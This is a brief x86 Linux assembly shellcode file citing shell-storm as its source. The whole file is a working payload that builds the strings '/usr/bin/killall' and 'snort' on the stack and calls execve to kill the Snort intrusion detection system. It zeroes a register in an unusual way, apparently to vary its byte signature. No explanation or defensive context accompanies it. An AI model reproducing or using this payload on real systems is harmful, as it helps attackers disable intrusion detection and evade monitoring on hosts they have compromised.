;original link http://shell-storm.org/shellcode/files/shellcode-741.php

global _start
section .text
_start:

	mov ebx, eax
	xor eax, ebx

	mov ebx, eax
	mov dword [esp-4], ebx
	sub esp, 4
	test eax, eax
		
	push 0x74	
	push 0x726f6e73
	mov esi, esp
	
	push eax
	push dword 0x6c6c616c
	push dword 0x6c696b2f
	push dword 0x6e69622f
	push dword 0x7273752f
	mov ebx,esp
	
	push eax
	push esi
	push ebx
	mov ecx, esp
	
	cdq
	
	mov al, 0xa
	inc eax
	int 0x80
	
